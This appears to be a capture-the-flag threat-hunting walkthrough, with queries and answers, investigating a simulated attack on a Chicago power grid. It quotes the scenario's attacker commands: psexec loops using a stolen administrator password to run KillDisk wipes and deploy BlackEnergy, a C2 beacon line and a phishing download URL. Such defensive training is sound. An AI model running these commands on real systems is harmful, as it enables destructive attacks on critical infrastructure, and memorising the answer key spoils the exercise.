## Critical Compromise In Chicago - ICS: Section 1: Scada Nada<br>
### **Summary**<br>
BREAKING NEWS!: Massive Power Outage Disrupts One of the Country’s Premier Cybersecurity Conferences!
<br><br>
Chicago, IL – A sudden and widespread power outage has plunged the city of Chicago into darkness, causing a huge disruption, including shutting down one of the nation’s leading cybersecurity conferences. Experts are scrambling to assess the cause of the outage, which has affected critical infrastructure and left thousands without power.
<br><br>
Early reports suggest the possibility of a cyberattack targeting the city’s power grid, heightening concerns over the vulnerability of critical systems. Local authorities have urged residents to remain calm as investigations continue into the scope of the incident.
<br><br>
Stay tuned for further updates.
<br><br>


**Q1. Enter Power Up to continue.**<br><br>

**Answer: Power Up**<br><br>


**Q2. Enter Grid Lock to continue.**<br><br>

**Answer: Grid Lock**<br><br>

**Q3. Enter Mission Accepted to continue.**<br><br>

**Answer: Mission Accepted**<br><br>

**Q4. How many results are there for processes that contain SCADA in the commandline?**<br><br>

```
ProcessEvents
| where process_commandline contains "SCADA"
```
<br>

**Answer: 5**<br><br>

**Q5. What is the name of the executable that was used to perform this scan?**<br><br>
The first result returned.<br><br>

```
C:\ProgramData\ICSScanner.exe --scan --network 192.168.0.0/16 --type SCADA --output C:\ProgramData\SCADA_IPs.txt
```
<br>

**Answer: ICSScanner.exe**<br><br>

**Q6. Paste the full timestamp for when this process was executed.**<br><br>
From previous query.<br><br>

**Answer: 9/9/2024, 11:17:44 AM**<br><br>

**Q7. What command was used to download this file?**<br><br>
Query from question 4.<br><br>

**Answer: curl -o C:\ProgramData\SCADA_Malicious_Commands.txt**<br><br>

**Q8. A destructive tool was used to wipe data and cause the SCADA systems to shut down. 🫨 What is the name of the executable that was used to do this?**<br><br>
The last result from the query from question 4.<br><br>

```
for /F 'tokens=1' %i in (C:\\ProgramData
\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe"
)
```
<br>

**Answer: KillDisk.exe**<br><br>

**Q9. What legitimate Windows tool was exploited to carry out these remote executions?**<br><br>

```
for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do (
  set /p password=<C:\\ProgramData\\Extracted_Password.txt
  psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe"
)
```
<br>

**Answer:  psexec.exe**<br><br>

**Q10. What executable did the theat actor use to establish persistence and perform reconnaissance on the SCADA systems during the attack?**<br><br>

**Answer: BlackEnergy.exe**<br><br>

**Q11. What is the name of the group responsible for these attacks?**<br><br>

**Answer: Sandworm**<br><br>

**Q12. What is the timestamp for the first time BlackEnergy was observed running in the command line on any host in our environment?**<br><br>

```
ProcessEvents
| where process_commandline contains "blackenergy"
```
<br>

**Answer: 8/29/2024, 8:28:45 AM**<br><br>

**Q13. On how many hosts was BlackEnergy present?**<br><br>

```
ProcessEvents
| where process_commandline contains "blackenergy"
| distinct hostname
```
<br>

**Answer: 1**<br><br>

**Q14. What is the hostname where BlackEnergy was found?**<br><br>
From previous question.<br><br>

**Answer: BDC0-DESKTOP**<br><br>

**Q15. What is the name of the employee that BDC0-DESKTOP belongs to?**<br><br>

```
Employees
| where hostname == "BDC0-DESKTOP"
```
<br>

**Answer: Jibby Saetang**<br><br>

**Q16. What is the employee's role?**<br><br>
From previous question.<br><br>

**Answer: SCADA Operator**<br><br>

**Q17. What is the name of the file that the user downloaded, which is likely related to BlackEnergy?**<br><br>
Look for emails around when Blackenergy.exe was found.<br><br>

```
Email
| where recipient == "jibby_saetang@chicagopowergrid.com"
| where timestamp >= datetime(8/29/2024)
```
<br>
Email sent by joseph_eisenman@chicagopowergrid.com. The link is below.<br><br>

```
http://chicagogridupdates.com/published/public/files/images/Urgent_Cyber_Threat_Alert.zip
```
<br>
This zip file look suspicious.<br><br>

**Answer: Urgent_Cyber_Threat_Alert.zip**<br><br>

**Q18. What is the timestamp for when the user downloaded that file?**<br><br>

```
OutboundNetworkEvents
| where src_ip == "10.10.0.8"
| where timestamp >= datetime(8/29/2024)
```
<br>

**Answer: 2024-08-29T08:28:01Z**<br><br>

**Q19. What is the SHA256 hash of the file created immediately after the downloaded file?**<br><br>

```
FileCreationEvents
| where hostname == 'BDC0-DESKTOP'
| where timestamp >= datetime(2024-08-29T08:28:01Z)
| take 2
```
<br>

**Answer: 1dc1dbfc1d636fed5cebe43787a7abf2df4fbb51e1beaec34ba72dd5152edc81**<br><br>

**Q20. What process shows the user opening the zip file? (paste the full command)**<br><br>

```
ProcessEvents
| where process_commandline contains "urgent"
```
<br>

**Answer: Explorer.exe "C:\Users\jisaetang\Downloads\Urgent_Cyber_Threat_Alert.zip"**<br><br>

**Q21. What is the name of the domain that BlackEnergy beacons to after execution?**<br><br>

```
ProcessEvents
| where process_commandline contains "energy"
```
<br>

Shorty after the BlackEnergy.exe was opened it connected to the domain below.<br><br>

```
BlackEnergy.exe --beacon-interval 10 --c2 chicagogridupdates.com --scan 192.168.1.0/24
```
<br>

**Answer: chicagogridupdates.com **<br><br>

**Q22. To find out why, enter Unmask the Phish.**<br><br>

**Answer: Unmask the Phish**<br><br>

